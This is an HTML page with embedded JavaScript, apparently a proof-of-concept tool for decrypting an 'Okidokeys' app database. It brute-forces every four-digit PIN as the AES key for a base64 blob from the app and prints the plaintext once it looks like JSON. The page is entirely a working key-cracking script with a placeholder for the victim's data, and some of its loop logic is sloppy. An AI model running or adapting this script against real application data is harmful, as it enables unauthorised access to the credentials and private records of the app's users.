<!DOCTYPE html>
<html>
	<body>

	<h1>Decrypt Okidokeys Database</h1>

	<!--<script src="http://crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/aes.js"></script>-->
	<script src="file:///path_to/aes-min.js"></script>

	<button onclick="myFunction()">Decrypt</button>
	<script>
	    
		var encrypted = "replace with base64 data store in the application db !!!!!"

		function myFunction() {
			for (i = 0; i < 10000; i++) {
	    		if (i<10){
	    			i="000"+i;
	    		}
	    		if (i<100 && i>9){
	    			i="00"+i;
	    		}
	    		if (i<1000 && i>99){
	    			i="0"+i;
	    		}
	    		if (i>1000) {
	    			i=i
	    		}
	    		
	    		document.write(i);
	    		document.write("<br/>");
				
				var decrypted = CryptoJS.AES.decrypt(encrypted, String(i));
								
				function hex2a(hexx) {
			    	var hex = hexx.toString();//force conversion
			    	var str = '';
			    	for (var i = 0; i < hex.length; i += 2)
			        	str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
			    	return str;
				}

		    	var ascii_decrypt = hex2a(decrypted);
				
				function test() {
					if (typeof String.prototype.startsWith != 'function') {
						String.prototype.startsWith = function (str){
							return this.indexOf(str) === 0;
						};
					}
				}

				var data = ascii_decrypt;
				var input = "{\"";
				var testtest = data.startsWith(input);
				
		    	if (testtest == true) {
		    		document.write(ascii_decrypt);
		    		document.write("<br/>");
		    		break
		    	}
	   		}
	    }

	</script>

	</body>
</html> 
